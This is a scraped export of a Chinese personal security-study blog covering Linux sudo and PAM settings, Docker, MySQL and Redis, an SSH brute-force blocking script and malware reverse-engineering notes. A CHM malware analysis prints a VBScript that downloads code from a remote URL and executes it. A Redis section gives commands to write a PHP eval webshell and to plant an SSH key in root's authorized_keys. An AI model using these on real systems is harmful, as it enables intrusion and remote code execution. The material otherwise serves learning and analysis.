/usr/sbin/ip,/usr/sbin/fdisk,/usr/bin/less# 修改用户组groupadd smartgouseradd it01 -G smartgo%smartgo ALL=NOPASSWD: /usr/sbin/ip%smartgo ALL=NOPASSWD: /usr/sbin/useradd, /user/sbin/userdel,/bin/passwd%smartgo ALL=NOPASSWD: !/usr/bin/rm%smartgo ALL=NOPASSWD: !/bin/passwd root, !/bin/passwd root --stdin, !/bin/passwd --stdin root sudo 日志 123cat /etc/rsyslog.conf |grep &#x27;^authprivauthpriv.* /var/log/secure 4、用户认证 PAM认证 gdm 认证、kdm 认证 su 认证 ssh 认证 ftp samba 自带数据库验证方式 Mysql Web验证方式 （httppasswd） PAM (Pluggable Authentication Modules) 可拔插认证式模块。 四种认证类型 auth 认证管理 验证使用者身份，账户和密码 account 用户管理 基于用户时间或者密码有限期来决定是否允许访问 password 密码（口令）认证管理 禁止用户反复尝试登陆，在变更密码时进行密码复杂性控制 session 会话管理 进行日志记录，或者限制用户登陆的次数，资源限制 流程标记 1234567891011Required (必要条件) 验证失败，仍然继续，最后仍然返回FailRequisite （必要条件） 验证失败立即结束Sufficient （充分条件） 验证成功立即返回，否则忽略结果继续Optional （可选条件） 结果不影响Include 包含另外一个配置条件相同的行Substack 垂直叠加 PAM 常用模块 pam_rootok.so &#x2F;etc&#x2F;pam.d&#x2F;su 示例 限制root 切换到其他用户也需要密码 1234567[root@192 ~]# cat /etc/pam.d/su#%PAM-1.0auth sufficient pam_rootok.so 这一行注释了就代表从root 切换到其他用户也需要密码[root@192 ~]# cat /etc/pam.d/su#%PAM-1.0auth sufficient pam_rootok.so pam.access.so 123456789101112131415161718访问控制，配置文件 修改 /etc/pam.d/sshd新增Auth required pam.access.so修改 /etc/security/access.conf# 例如 限制用户从哪些网段登录# -代表deny 后面跟用户 +地址-:root:192.168.2.30 +:root:192.168.2.0/24 EXCEPT 192.168.2.1 pam_time.so 12345678基于时间的访问控制，默认配置文件在 /etc/security/time.confgrep time /etc/pam.d/sshdaccount required pam_time.so # 新增的内容# 修改 /etc/security/time.conf 实现基于时间的控制 pam_tally2.so 功能：登录统计 1234567grep tally /etc/pam.d/sshdauth required pam_tally2.so deny=3 even_deny_root root_unlock_time=60 unlock_time=60# 查看被锁了多少次pam_tally2 -u# 清空计数pam_tally2 --reset -u root pam 资源限制 对用户进行系统资源使用限制 pam_limits.so 功能：限制用户会话过程中对各种资源的使用情况 &#x2F;etc&#x2F;security&#x2F;limits.conf &#x2F;etc&#x2F;security&#x2F;limits.d&#x2F;*.conf 12# domain type item valuejack soft nofile 10240 # 设置jack 用户最大打开文件数10240个 Cgroup 对资源进行限制 123456789101112131415161718192021yum -y install libcgroupsystemctl enable cgconfigsystemctl start cgconfigman cgconfig.confvim /etc/cgconfig.confgroup lesscpu &#123; cpu&#123; cpu.shares=200(ms); &#125;&#125;group morecpu &#123; cpu&#123; cpu.shares=800(ms); &#125;&#125;cgexec -g cpu:lesscpu sha1sum /dev/zerocgexec -g cpu:morecpu md5sum /dev/zero可以看到以上两个进程的CPU 占比大概是1：4 的样子 1","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"一个chm恶意文件分析","slug":"逆向/chm木马分析","date":"2023-05-05T16:00:00.000Z","updated":"2024-03-12T15:59:04.297Z","comments":true,"path":"2023/05/06/逆向/chm木马分析/","link":"","permalink":"http://zwjsfdbb.top/2023/05/06/%E9%80%86%E5%90%91/chm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/","excerpt":"1、7zip解压后找到html文件中的恶意代码如下 在html 中有两个OBJECR标签，标签的作用是创建一个 ActiveX 控件，在页面上创建快捷方式，随后调用click函数从而执行快捷方式对应的内容。 。OBJECT 标签中有几个 PARAM 标签，它们定义了控件所需的参数。这些参数包括 Command（表示执行类型）、Button（表示按钮样式）、Item1 和 Item2（表示快捷方式的属性）。 可以很清晰的看出 cfx 的作用是创建C:\\ProgramData\\Iconcache.dat”并解码成C:\\ProgramData\\Iconcache.vbs，vbs的内容为 1On Error Resume Next:Set ineszcdwlpoj = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;):ineszcdwlpoj.open &quot;GET&quot;, &quot;https://drive.google.com/uc?export=download&amp;id=1Ovbe1se3Rh9WH1LYT1ob1ngpdtjJW1yF&amp;confirm=t&quot;, False:ineszcdwlpoj.Send:Execute(ineszcdwlpoj.responseText)&#x27;tffxddrsdssawdxvcbgnhjjuyjbv wsy的功能为执行vbs ，下载文件并执行。","text":"1、7zip解压后找到html文件中的恶意代码如下 在html 中有两个OBJECR标签，标签的作用是创建一个 ActiveX 控件，在页面上创建快捷方式，随后调用click函数从而执行快捷方式对应的内容。 。OBJECT 标签中有几个 PARAM 标签，它们定义了控件所需的参数。这些参数包括 Command（表示执行类型）、Button（表示按钮样式）、Item1 和 Item2（表示快捷方式的属性）。 可以很清晰的看出 cfx 的作用是创建C:\\ProgramData\\Iconcache.dat”并解码成C:\\ProgramData\\Iconcache.vbs，vbs的内容为 1On Error Resume Next:Set ineszcdwlpoj = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;):ineszcdwlpoj.open &quot;GET&quot;, &quot;https://drive.google.com/uc?export=download&amp;id=1Ovbe1se3Rh9WH1LYT1ob1ngpdtjJW1yF&amp;confirm=t&quot;, False:ineszcdwlpoj.Send:Execute(ineszcdwlpoj.responseText)&#x27;tffxddrsdssawdxvcbgnhjjuyjbv wsy的功能为执行vbs ，下载文件并执行。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"段跳转执行64位shellcode","slug":"逆向/段跳转执行64位shellcode","date":"2023-05-04T16:00:00.000Z","updated":"2024-03-12T14:47:11.161Z","comments":true,"path":"2023/05/05/逆向/段跳转执行64位shellcode/","link":"","permalink":"http://zwjsfdbb.top/2023/05/05/%E9%80%86%E5%90%91/%E6%AE%B5%E8%B7%B3%E8%BD%AC%E6%89%A7%E8%A1%8C64%E4%BD%8Dshellcode/","excerpt":"1、背景逆向分析一个样本过程中，发现32位程序执行了64位shellcode，通过段跳转实现。 （ cs:eip cs在x32下为0x23，在64位下为0x33） 2、分析过程shellcode如下 执行6140863，修改CS为0x33，随后返回。 返回以后，代码变成了64位代码","text":"1、背景逆向分析一个样本过程中，发现32位程序执行了64位shellcode，通过段跳转实现。 （ cs:eip cs在x32下为0x23，在64位下为0x33） 2、分析过程shellcode如下 执行6140863，修改CS为0x33，随后返回。 返回以后，代码变成了64位代码 随后执行NtCreateThreadEx, 参数分布如下：根据 fastcall 调用约定，前四个参数由寄存器传递（ RCX、RDX、R8、R9），其他参数由 RSP+0x20 开始压栈，所以可以看出线程函数地址为020f0000 12345678910111213NTSTATUS NtCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit, SIZE_T SizeOfStackReserve, LPVOID lpBytesBuffer); 找到对应的进程ID，线程函数为020f0000，windbg 调试即可。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"Docker 基本操作学习","slug":"Web渗透/Docker_new","date":"2023-04-23T16:00:00.000Z","updated":"2024-03-12T10:39:56.648Z","comments":true,"path":"2023/04/24/Web渗透/Docker_new/","link":"","permalink":"http://zwjsfdbb.top/2023/04/24/Web%E6%B8%97%E9%80%8F/Docker_new/","excerpt":"Docker–常用操作命令1、对比虚拟机 安装虚拟机软件，安装操作系统，备份虚拟机文件，随时复制并启动 在Linux 安装Docker应用程序，从镜像仓库拉取操作系统或者应用环境，基于该镜像文件创建一个容器（运行环境），备份容器以供下次使用，或者将容器提交为本地镜像 虚拟机模拟一套全新的硬件环境，而Docker 则是直接使用宿主机资源 2、安装 123456789yum install net-toolsyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum makecache fastyum -y install docker-cesystemctl start dockerdocker infosystemctl list-unit-filessystemctl list-unit-files |grep docker 2、docker命令 12345678910111213141516docker ps # 查看当前运行的容器docker images # 列举当前的镜像docker search centos # 查找镜像docker pull hello-world # 拉取镜像docker create hello-world # 创建容器[root@192 ~]# docker create --name your_docker_name hello-world56ca1631d20a8e016f47545e0d0d65c253709629000ade70571c34bc54cfc2c8docker container ls -a # 查看所有的容器[root@192 ~]# docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES56ca1631d20a hello-world &quot;/hello&quot; 44 seconds ago Created vibrant_kalamdocker run --name your_docker_name hello-world # 创建并启动容器 相关网址： https://hub.daocloud.io/","text":"Docker–常用操作命令1、对比虚拟机 安装虚拟机软件，安装操作系统，备份虚拟机文件，随时复制并启动 在Linux 安装Docker应用程序，从镜像仓库拉取操作系统或者应用环境，基于该镜像文件创建一个容器（运行环境），备份容器以供下次使用，或者将容器提交为本地镜像 虚拟机模拟一套全新的硬件环境，而Docker 则是直接使用宿主机资源 2、安装 123456789yum install net-toolsyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repoyum makecache fastyum -y install docker-cesystemctl start dockerdocker infosystemctl list-unit-filessystemctl list-unit-files |grep docker 2、docker命令 12345678910111213141516docker ps # 查看当前运行的容器docker images # 列举当前的镜像docker search centos # 查找镜像docker pull hello-world # 拉取镜像docker create hello-world # 创建容器[root@192 ~]# docker create --name your_docker_name hello-world56ca1631d20a8e016f47545e0d0d65c253709629000ade70571c34bc54cfc2c8docker container ls -a # 查看所有的容器[root@192 ~]# docker container ls -aCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES56ca1631d20a hello-world &quot;/hello&quot; 44 seconds ago Created vibrant_kalamdocker run --name your_docker_name hello-world # 创建并启动容器 相关网址： https://hub.daocloud.io/","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"数据库学习","slug":"系统基础/数据库学习_new","date":"2023-04-23T16:00:00.000Z","updated":"2024-03-12T10:41:41.809Z","comments":true,"path":"2023/04/24/系统基础/数据库学习_new/","link":"","permalink":"http://zwjsfdbb.top/2023/04/24/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0_new/","excerpt":"1、分类 非关系数据库：Memcached&#x2F;Redis 缓存服务器，将数据保存到内存中以提高访问效率 关系数据库：Mysql 2、MYSQL数据库常用操作 增删查改 1234567891011121314create database school character set &#x27;utf8mb4&#x27;; #创建数据库create table student (id int,sid varchar(15),sname varchar(15),sphone char(11),ssec char(1),sage tinyint,create_time datetime); # 创建表show columns from student; # 查看表的结构desc student; # 查看表的结构INSERT INTO student(sid,name,phone,sex,age,degree,college.createtime) values (xx) # 插入数据# 插入多条数据以;结尾# 删除数据-清空TRUNCATE TABLE student;DELETE FROM student;DELETE FROM student where sid=&#x27;&#x27;; # 删除特定数据，通过where 指定条件# 更新数据UPDATE student SET sname=&#x27;xxx&#x27;; # 也可以加where 条件 Navicat 始终无法连接 解决办法 # 放行3306 ，最大可能就是这个原因 firewall-cmd --permanent --zone=public --add-port=3306/tcp firewall-cmd --reload 12345- ``` # 给权限允许外部连接 GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION; FLUSH privileges; # 设置密码，允许连接 update user set host=&#39;%&#39; where user=&#39;root&#39;; set password =password(&#39;123456&#39;); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758- 约束 - 主键约束 - 外键结束 - 唯一约束 - 查询语句```powershell# 利用子查询SELECT * FROM student WHERE age=(SELECT MAX(age) FROM student));# like模糊查询 %代替任意多个字符 _代替一个字符SELECT * FROM WHERE sname like &#x27;李%&#x27;# 统计某个列的总和、平均数SELECt SUM(age) From student;SELECt AVG(age) From student;# 查询C10课程排名前5的学生SELECT * FROM grade where courseid=&#x27;c10&#x27; order by score DESC limit 5;# 保存并列SELECT * FROM grade where courseid=&#x27;c10&#x27; and grade in (SELECT grade FROM grade where courseid=&#x27;c10&#x27; order by DESC limit 5);# 分组查询 GROUP BY 自动去重 SELECT coursed,AVG(score) FROM grade GROUP BY courseid;# 如果要对GROUP BY 以后的聚合函数运算出来的结果进行过滤，使用HAVING, WHERE 必须在GROUP by 之前SELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid HAVING AvgScore &gt;70&#x27;;对的SELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid WHERE AvgScore &gt;70&#x27;;错误SELECT coursed,AVG(score) AS AvgScore FROM grade WHERE AvgScore &gt;70&#x27; GROUP BY courseid :错误# 子查询的 语句 ANY ALL SELECT age FROM student WHERE age &lt;ANY(SELECT DISTINCT(age) From student WHERE degree=&#x27;xxx&#x27;)# UNION 两条SQL语句的查询结果拼成一个结果集 SELECT xxx 用于一些灵活的东西 SELCT classid.calssname FROM class UNION SELECT &#x27;S04&#x27;,&#x27;网安3班&#x27;# 多表查询SELECT * FROM student ,class where student.studentid = grade.studentid;SELECT * FROM student JOIN class ON student.studentid = grade.studentid;SELECT * FROM student INNER JOIN class ON student.studentid = grade.studentid;# left join on 和right join on# 视图 可以把一个很复杂的SQL语句创建为视图，从而将查询结果永久的保存在一张类似表的结构中去，并且支持SQL查询# 索引# 用于帮助提升数据库查询性能，避免全表扫描导致速度极慢# 如何判断索引是否成功EXPLAIN SELECT * from customer where phone=&#x27;xxx&#x27;# 利用sql语句写到文件SELECT “xxx ” INTO OUTFILE &#x27;/tmp/xxx&#x27;# 数据库备份mysqldump -h127.0.0.1 -ppassword xxx &gt;xx.sql# 还原数据库mysqldump -h127.0.0.1 -ppassword xxx &lt;xx.sql 主从复制 两台机器进行数据的实时同步。Master,Slave 所有数据以Master为准，Slave 进行实时复制同步&#x3D;&#x3D;》实时备份，读写分离，写数据到Master,读从Salve。 3、Redis 数据库","text":"1、分类 非关系数据库：Memcached&#x2F;Redis 缓存服务器，将数据保存到内存中以提高访问效率 关系数据库：Mysql 2、MYSQL数据库常用操作 增删查改 1234567891011121314create database school character set &#x27;utf8mb4&#x27;; #创建数据库create table student (id int,sid varchar(15),sname varchar(15),sphone char(11),ssec char(1),sage tinyint,create_time datetime); # 创建表show columns from student; # 查看表的结构desc student; # 查看表的结构INSERT INTO student(sid,name,phone,sex,age,degree,college.createtime) values (xx) # 插入数据# 插入多条数据以;结尾# 删除数据-清空TRUNCATE TABLE student;DELETE FROM student;DELETE FROM student where sid=&#x27;&#x27;; # 删除特定数据，通过where 指定条件# 更新数据UPDATE student SET sname=&#x27;xxx&#x27;; # 也可以加where 条件 Navicat 始终无法连接 解决办法 # 放行3306 ，最大可能就是这个原因 firewall-cmd --permanent --zone=public --add-port=3306/tcp firewall-cmd --reload 12345- ``` # 给权限允许外部连接 GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION; FLUSH privileges; # 设置密码，允许连接 update user set host=&#39;%&#39; where user=&#39;root&#39;; set password =password(&#39;123456&#39;); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758- 约束 - 主键约束 - 外键结束 - 唯一约束 - 查询语句```powershell# 利用子查询SELECT * FROM student WHERE age=(SELECT MAX(age) FROM student));# like模糊查询 %代替任意多个字符 _代替一个字符SELECT * FROM WHERE sname like &#x27;李%&#x27;# 统计某个列的总和、平均数SELECt SUM(age) From student;SELECt AVG(age) From student;# 查询C10课程排名前5的学生SELECT * FROM grade where courseid=&#x27;c10&#x27; order by score DESC limit 5;# 保存并列SELECT * FROM grade where courseid=&#x27;c10&#x27; and grade in (SELECT grade FROM grade where courseid=&#x27;c10&#x27; order by DESC limit 5);# 分组查询 GROUP BY 自动去重 SELECT coursed,AVG(score) FROM grade GROUP BY courseid;# 如果要对GROUP BY 以后的聚合函数运算出来的结果进行过滤，使用HAVING, WHERE 必须在GROUP by 之前SELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid HAVING AvgScore &gt;70&#x27;;对的SELECT coursed,AVG(score) AS AvgScore FROM grade GROUP BY courseid WHERE AvgScore &gt;70&#x27;;错误SELECT coursed,AVG(score) AS AvgScore FROM grade WHERE AvgScore &gt;70&#x27; GROUP BY courseid :错误# 子查询的 语句 ANY ALL SELECT age FROM student WHERE age &lt;ANY(SELECT DISTINCT(age) From student WHERE degree=&#x27;xxx&#x27;)# UNION 两条SQL语句的查询结果拼成一个结果集 SELECT xxx 用于一些灵活的东西 SELCT classid.calssname FROM class UNION SELECT &#x27;S04&#x27;,&#x27;网安3班&#x27;# 多表查询SELECT * FROM student ,class where student.studentid = grade.studentid;SELECT * FROM student JOIN class ON student.studentid = grade.studentid;SELECT * FROM student INNER JOIN class ON student.studentid = grade.studentid;# left join on 和right join on# 视图 可以把一个很复杂的SQL语句创建为视图，从而将查询结果永久的保存在一张类似表的结构中去，并且支持SQL查询# 索引# 用于帮助提升数据库查询性能，避免全表扫描导致速度极慢# 如何判断索引是否成功EXPLAIN SELECT * from customer where phone=&#x27;xxx&#x27;# 利用sql语句写到文件SELECT “xxx ” INTO OUTFILE &#x27;/tmp/xxx&#x27;# 数据库备份mysqldump -h127.0.0.1 -ppassword xxx &gt;xx.sql# 还原数据库mysqldump -h127.0.0.1 -ppassword xxx &lt;xx.sql 主从复制 两台机器进行数据的实时同步。Master,Slave 所有数据以Master为准，Slave 进行实时复制同步&#x3D;&#x3D;》实时备份，读写分离，写数据到Master,读从Salve。 3、Redis 数据库使用最为广泛的缓存服务器，数据保存在内存中，所有的IO操作在内存中，速度非常快，性能非常高。 断电数据消失。 安装与使用 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576# 下载链接 https://redis.io/download/tar xzvf redis-7.0.11.tar.gzcd redis-7.0.11/ &amp;&amp; make &amp;&amp; make installredis-server ./redis.conf [root@192 redis-7.0.11]# redis-cli127.0.0.1:6379&gt; set name zwjOK127.0.0.1:6379&gt; get name&quot;zwj&quot;# 设置过期时间127.0.0.1:6379&gt; expire name 10(integer) 1127.0.0.1:6379&gt; exists name(integer) 1127.0.0.1:6379&gt; ttl name(integer) 2127.0.0.1:6379&gt; ttl name(integer) -2127.0.0.1:6379&gt; exists name(integer) 0127.0.0.1:6379&gt; ttl name(integer) -1127.0.0.1:6379&gt; expire name 10(integer) 1127.0.0.1:6379&gt; ttl name(integer) 8127.0.0.1:6379&gt; PERSIST name(integer) 1127.0.0.1:6379&gt; ttl name(integer) -1# 按照列进行设置，可用于表格类型的存储 （hash类型数据）127.0.0.1:6379&gt; hset user_1 name zwj(integer) 1127.0.0.1:6379&gt; hset user_1 address chengdu(integer) 1127.0.0.1:6379&gt; hset user_1 age 19(integer) 1127.0.0.1:6379&gt; HGET user_1 name&quot;zwj&quot;127.0.0.1:6379&gt; # 列表类型的数据127.0.0.1:6379&gt; lpush name_list lisi(integer) 2127.0.0.1:6379&gt; lpush name_list wangwu(integer) 3127.0.0.1:6379&gt; keys name_list1) &quot;name_list&quot;127.0.0.1:6379&gt; lrange name_list 0 -11) &quot;wangwu&quot;2) &quot;lisi&quot;3) &quot;zhangsan&quot;127.0.0.1:6379&gt; LINDEX name_list 0&quot;wangwu&quot;# 集合类型的数据 （不允许重复） 默认会去重处理 sadd 添加的不排序，zadd 添加的会按照score排序sadd key value127.0.0.1:6379&gt; sadd set qwer qwer(integer) 1 (新增一个)127.0.0.1:6379&gt; sadd set qwer 12345(integer) 1 （只新增一个）127.0.0.1:6379&gt; sadd set 22 33 44 (integer) 3 （新增3个）127.0.0.1:6379&gt; scard set(integer) 5127.0.0.1:6379&gt; smembers set1) &quot;33&quot;2) &quot;22&quot;3) &quot;12345&quot;4) &quot;qwer&quot;5) &quot;44&quot;# 清空数据库flushdb # 清空当前 flush 默认16个数据库flushall # 清空所有 配置远程连接 123456vim redis.config注释 bind 127.0.0.1 -::1取消注释 requiredpass 123456firewalld 开放6379 端口 123456789101112131415161718192021222324252627282930313233[root@192 ~]# firewall-cmd --list-allpublic (active) target: default icmp-block-inversion: no interfaces: ens33 sources: services: dhcpv6-client ssh ports: 3306/tcp protocols: masquerade: no forward-ports: source-ports: icmp-blocks: rich rules: [root@192 ~]# firewall-cmd --add-port=6379/tcp --permanent success[root@192 ~]# firewall-cmd --reloadsuccess[root@192 ~]# firewall-cmd --list-allpublic (active) target: default icmp-block-inversion: no interfaces: ens33 sources: services: dhcpv6-client ssh ports: 3306/tcp 6379/tcp protocols: masquerade: no forward-ports: source-ports: icmp-blocks: rich rules: 配置后台运行 12vim redis.conf更改 daemonize yes redis 持久化 rdb 保存 默认情况下保存在dump.rdb文件中 更改策略如下： 12345678# * After 3600 seconds (an hour) if at least 1 change was performed# * After 300 seconds (5 minutes) if at least 100 changes were performed# * After 60 seconds if at least 10000 changes were performed## You can set these explicitly by uncommenting the following line.## save 3600 1 300 100 60 10000save 60 2 # 一分钟内有两个key发生了变化就备份 AOF保存 123456789101112131415always 每次写入都同步everysec 每秒一次no 系统控制修改 redis.confappendonly no 更改为yes 默认关闭修改同步策略 默认每秒# appendfsync alwaysappendfsync everysec# appendfsync no 主从复制 配置master和slave 两台电脑分别配置后台运行，可远程登录，需要密码，日志路径，然后在slave 机器上 masterauth pass 12345daeminize yesmasterauth 123456requirepass 123456logfile redis.log注释掉 bind 127.0.0.1 -：：1 接着在slave 机器上运行slaveeof masterip masterport ，最后用info replication 查看配置情况 安全漏洞相关 redis写入webshell 12345678910111213141516171819202122config set dir /var/www/htmlconfig set dbfilename zcc.phpset xxx &quot;\\n\\n\\n&lt;?php @eal($_POST[&#x27;zcc&#x27;]);?&gt;\\n\\n&quot;save攻击者可以通过向受攻击的服务器发送恶意 HTTP POST 请求来利用这段代码。具体步骤如下：1. 获取 Redis 服务器的 IP 地址和端口号。2. 发送一个类似于以下内容的 HTTP POST 请求到服务器：```POST / HTTP/1.1Host: &lt;Redis 服务器 IP 地址&gt;:&lt;Redis 服务器端口号&gt;Content-Type: application/x-www-form-urlencodedContent-Length: &lt;Payload 长度&gt;zcc=&lt;?php phpinfo();?&gt;```上述请求会将一段 PHP 代码 `&lt;?php phpinfo();?&gt;` 发送给 Redis 数据库，并将其存储到之前设置的名为 &quot;xxx&quot; 的键中。3. 在发送完请求后，攻击者可以访问之前指定的目录 `/var/www/html`，并执行 `zcc.php` 文件。该文件中包含了攻击者注入的 PHP 代码，因此会执行 `phpinfo()` 函数并显示当前 PHP 环境的信息。 redis 写入ssh公钥登录 12345ssh-keygen -t rsa config set dir /root/.sshconfig set dbfilename authorized_keysset x &quot;\\n\\n\\n 公钥 \\n\\n\\n&quot;save 4、Oracle关系型数据库，企业型数据库，比较复杂，主要掌握和Mysql 数据库的区别，大同小异 Oracle 的数据库结构 oracle服务-&gt;表空间-&gt;多个表-&gt;各个表结构 Oracle 的用户 Oracle 的日期格式，to_date(“日期”，‘YYYY-MM-DD HH24:Mi:SS’) 转换，输出的时候用to_char(date,‘YYYY-MM-DD HH24:Mi:SS’) Group By 使用时，聚合函数不能与无关的列放在一起select 没有Limit 关键词，要用rownum,虚拟列 如取前10 rownum&lt;&#x3D;10; 没有自增列，要创建序列 12select MYSEQ.nextval from dual;insert into demo(id,name) values(MYSEQ.nextval,&#x27;zhangsan&#x27;); 备份命令 exp &#x2F;imp","categories":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"系统基础","slug":"系统基础","permalink":"http://zwjsfdbb.top/tags/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/"}]},{"title":"屏蔽SSH远程暴力登录","slug":"应急响应/屏蔽SSH远程暴力登录","date":"2023-04-19T16:00:00.000Z","updated":"2024-03-12T10:05:00.430Z","comments":true,"path":"2023/04/20/应急响应/屏蔽SSH远程暴力登录/","link":"","permalink":"http://zwjsfdbb.top/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E5%B1%8F%E8%94%BDSSH%E8%BF%9C%E7%A8%8B%E6%9A%B4%E5%8A%9B%E7%99%BB%E5%BD%95/","excerpt":"1、背景通过SSH远程登录失败多次，通过防火墙将其屏蔽，并发送通知 2、分析问题-解决过程如何判断SSH远程登录失败 通过查看&#x2F;var&#x2F;log&#x2F;secure 查看，如下即为登录失败的情况，如果多次出现，则可以判定为非法登录 12Apr 20 22:16:40 192 sshd[5101]: Failed password for root from 192.168.101.15 port 50632 ssh2 123456789101112failedcount=$(cat /var/log/secure |grep &quot;Failed password&quot;|wc -l)if [ $failedcount -gt 2 ]; then echo &quot;too many count&quot; ip=$(cat /var/log/secure |grep &quot;Failed&quot; |awk &#x27;&#123;print $11&#125;&#x27; |uniq) status_fire=$(firewall-cmd --state) if [ $status_fire != &quot;running&quot; ]; then systemctl start firewalld fi firewall-cmd --add-rich-rule=&#x27;rule family=ipv4 source address=&quot;$ip&quot; drop&#x27; echo &quot;$ip 被防火墙阻止&quot; fi pkill 可根据进程名kill 掉进程 who 可以看到哪些人登录了","text":"1、背景通过SSH远程登录失败多次，通过防火墙将其屏蔽，并发送通知 2、分析问题-解决过程如何判断SSH远程登录失败 通过查看&#x2F;var&#x2F;log&#x2F;secure 查看，如下即为登录失败的情况，如果多次出现，则可以判定为非法登录 12Apr 20 22:16:40 192 sshd[5101]: Failed password for root from 192.168.101.15 port 50632 ssh2 123456789101112failedcount=$(cat /var/log/secure |grep &quot;Failed password&quot;|wc -l)if [ $failedcount -gt 2 ]; then echo &quot;too many count&quot; ip=$(cat /var/log/secure |grep &quot;Failed&quot; |awk &#x27;&#123;print $11&#125;&#x27; |uniq) status_fire=$(firewall-cmd --state) if [ $status_fire != &quot;running&quot; ]; then systemctl start firewalld fi firewall-cmd --add-rich-rule=&#x27;rule family=ipv4 source address=&quot;$ip&quot; drop&#x27; echo &quot;$ip 被防火墙阻止&quot; fi pkill 可根据进程名kill 掉进程 who 可以看到哪些人登录了 12345678910111213141516171819202122232425262728293031# 实现功能，防火墙禁止访问以及关闭已经连接的session failedcount=$(cat /var/log/secure |grep &quot;Failed password&quot;|wc -l)if [ $failedcount -gt 2 ]; then echo &quot;too many count&quot; status_fire=$(firewall-cmd --state) if [ $status_fire != &quot;running&quot; ]; then systemctl start firewalld fi ip=&#x27;ip.txt&#x27; cat /var/log/secure |grep &quot;Failed&quot; |awk &#x27;&#123;print $11&#125;&#x27; |uniq &gt;$ip while read line;do firewall-cmd --add-rich-rule=&#x27;rule family=ipv4 source address=&quot;$line&quot; drop&#x27; if [ $? -eq 0 ]; then echo &quot;$line 被防火墙阻止&quot; else echo &quot;$line 未能被防火墙阻止&quot; &gt;alert.log mail -s &#x27;重要警告&#x27; 2194620553@qq.com &lt;alert.log fi # kill 已经连接的session who|grep $line|awk &#x27;print $2&#x27;&gt;tty.log while read xxx;do pkill -kill -t $xxx done &lt; tty.log # who |grep $ip |while read line; do term=$(echo $line|awk &#x27;&#123;print $2&#125;&#x27;);pkill -kill -t $term ; done done &lt; $ip # 替换掉已经操作的，防止重复操作 sed -i &#x27;s/Failed password/Failedxxpassword/g&#x27; /var/log/secure fi","categories":[{"name":"应急响应","slug":"应急响应","permalink":"http://zwjsfdbb.top/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"应急响应","slug":"应急响应","permalink":"http://zwjsfdbb.top/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}]},{"title":"Linux 文件监控小脚本","slug":"系统基础/Linux 文件监控_new","date":"2023-04-17T16:00:00.000Z","updated":"2024-03-12T09:53:42.235Z","comments":true,"path":"2023/04/18/系统基础/Linux 文件监控_new/","link":"","permalink":"http://zwjsfdbb.top/2023/04/18/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/Linux%20%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7_new/","excerpt":"Linux文件监控小脚本1、通过md5sum 对比 1234# 计算root目录下所有文件的md5 并重定向到origin_md5find /root/* --type f |xargs md5sum &gt; origin_md5# 检查文件有没有被修改，导致md5变化mdsum -c orign_md5 2、通过diff 命令比较内容的修改，目录里面文件的新增也可以检测到 修改了xxx .&#x2F;origin&#x2F;anaconda-ks.cfg: OK.&#x2F;origin&#x2F;monitor.sh: OK.&#x2F;origin&#x2F;test.txt: OK.&#x2F;origin&#x2F;xxx: FAILEDmd5sum: WARNING: 1 computed checksum did NOT match 删除了xxx .&#x2F;origin&#x2F;anaconda-ks.cfg: OK.&#x2F;origin&#x2F;monitor.sh: OK.&#x2F;origin&#x2F;test.txt: 